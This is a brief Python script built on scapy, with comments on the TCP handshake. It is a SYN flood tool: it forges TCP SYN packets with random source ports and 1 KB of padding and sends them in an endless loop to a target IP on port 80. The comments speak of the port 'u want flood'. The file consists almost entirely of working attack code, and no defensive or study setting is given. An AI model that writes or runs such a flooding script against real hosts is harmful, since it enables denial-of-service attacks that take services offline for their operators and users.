from scapy.all import *

'''
TCP Handshake

Client ----SYN-----> Server
Client <----- SYN + ACK ----Server
Client ------ACK ----> Server

'''
# Target IP 

target_ip ='0.0.0.0'

# Target Port u want flood

target_port= 80

# forge IP packet with target ip as the destination IP address

ip = IP(dst = target_ip)

# forge a TCP SYN packet with a random source port
# and the target port as the destination port
'''
sport=RandShort() ==>  random port  from  1 to 65,535
dport             ==> destination port
flag = S          ==>  SYN flag
'''
tcp = TCP(sport=RandShort(),dport=target_port,flags='S')


# Add some flooding data (1k in this case)

raw = Raw(b"X"*1024)

# stack up the layers

p = ip / tcp / raw

# send the constructed packet in a loop until CTRL+C is detected 

send(p,loop=1,verbose=0)


